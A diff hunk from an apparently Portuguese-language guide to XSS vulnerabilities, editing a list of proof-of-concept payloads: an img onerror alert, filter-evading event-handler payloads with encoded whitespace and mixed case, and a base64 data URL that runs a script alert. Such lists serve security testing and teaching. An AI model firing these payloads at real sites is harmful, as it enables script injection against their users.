@@ -17,7 +17,7 @@ Existem **três tipos principais** de vulnerabilidades XSS:
 <img src="" onerror=alert(window.origin)>
 <html%0aonpoIntEreNtER+=+[8].find(confirm)//>
 <details%09ontoGGle%09=%09[8].find(confirm)%0dx//>
-language?destination=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTUE9TRUQnKTwvc2NyaXB0Pg==
+/language?destination=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTUE9TRUQnKTwvc2NyaXB0Pg==
 ```
 Ferramenta útil: [URL/HTML Decoder - Eric Meyer](https://meyerweb.com/eric/tools/dencoder/)
 
